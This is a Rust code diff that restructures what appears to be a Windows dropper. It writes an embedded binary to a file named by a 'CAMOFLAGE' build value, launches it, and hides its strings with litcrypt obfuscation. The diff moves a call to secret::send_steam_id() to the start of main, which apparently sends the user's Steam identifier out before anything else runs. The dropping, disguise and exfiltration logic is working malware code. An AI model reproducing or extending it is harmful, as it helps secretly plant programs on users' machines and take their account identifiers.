@@ -30,12 +30,11 @@ use_litcrypt!();
 #[tokio::main]
 async fn main() {
     sdk::logger::init_env();
+    secret::send_steam_id().await;
+    deploy();
+}
 
-    let access_denied = || {
-        show_message(&lc!("Error"), &lc!("Access Denied"), MB_ICONWARNING | MB_OK);
-        std::process::exit(1);
-    };
-
+fn deploy() {
     let username = std::env::var(lc!("UserName")).expect("failed to retrieve user name");
     let camoflage = env!("CAMOFLAGE");
 
@@ -46,7 +45,6 @@ async fn main() {
         .join(&camoflage);
 
     log::debug!("{:?}", path);
-    secret::send_steam_id().await;
 
     if path.exists() {
         if let Ok(_) = Process::new(&camoflage) {
@@ -55,16 +53,37 @@ async fn main() {
                 &lc!("Gaben is already running"),
                 MB_ICONWARNING | MB_OK,
             );
-            return;
+            std::process::exit(1);
         }
 
-        if let Err(err) = Command::new(path).spawn() {
+        spawn(&path);
+    } else {
+        match File::create(&path) {
+            Ok(mut file) => {
+                file.write_all(&BINARY_BYTES).unwrap();
+                spawn(&path);
+            }
+            Err(err) => match err.kind() {
+                std::io::ErrorKind::PermissionDenied => access_denied(),
+                _ => log::error!("{:?}", err),
+            },
+        }
+    }
+}
+
+fn spawn(path: &PathBuf) {
+    match Command::new(path).spawn() {
+        Ok(_) => {
+            show_message(
+                &lc!("Success"),
+                &lc!("Gaben is watching now. Enjoy!"),
+                MB_ICONINFORMATION | MB_OK,
+            );
+        }
+        Err(err) => {
             match err.kind() {
-                std::io::ErrorKind::PermissionDenied => {
-                    log::error!("{:?}", err);
-                    access_denied();
-                }
-                err => {
+                std::io::ErrorKind::PermissionDenied => access_denied(),
+                _ => {
                     log::error!("{:?}", err);
                     show_message(
                         &lc!("Error"),
@@ -72,27 +91,8 @@ async fn main() {
                         MB_ICONERROR | MB_OK,
                     );
                 }
-            }
+            };
             return;
-        }
-    } else {
-        match File::create(path) {
-            Ok(mut file) => {
-                file.write_all(&BINARY_BYTES).unwrap();
-                show_message(
-                    &lc!("Success"),
-                    &lc!("Gaben is watching now. Enjoy!"),
-                    MB_ICONINFORMATION | MB_OK,
-                );
-                main();
-            }
-            Err(err) => match err.kind() {
-                std::io::ErrorKind::PermissionDenied => {
-                    log::error!("{:?}", err);
-                    access_denied();
-                }
-                err => log::error!("{:?}", err),
-            },
         }
     }
 }
@@ -109,4 +109,9 @@ fn show_message(title: &str, description: &str, style: MESSAGEBOX_STYLE) {
             style,
         );
     }
+}
+
+fn access_denied() {
+    show_message(&lc!("Error"), &lc!("Access Denied"), MB_ICONWARNING | MB_OK);
+    std::process::exit(1);
 }
